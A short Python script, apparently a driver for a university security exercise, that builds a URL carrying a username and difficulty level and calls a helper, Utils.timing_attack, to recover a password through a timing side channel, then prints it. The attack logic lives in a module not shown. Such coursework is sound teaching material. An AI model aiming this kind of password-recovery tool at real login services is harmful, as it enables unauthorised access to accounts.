import sys
import Utils


difficulty = sys.argv[2]
username = sys.argv[1]


start_url = f"http://aoi.ise.bgu.ac.il/?user={username}&password="
end_url = f"&difficulty={difficulty}"

Utils.configure_level(difficulty)
password = Utils.timing_attack(start_url=start_url, end_url=end_url)

if password and len(password) > 0:
    print(f"[main][{username}][{difficulty}]: {password}")


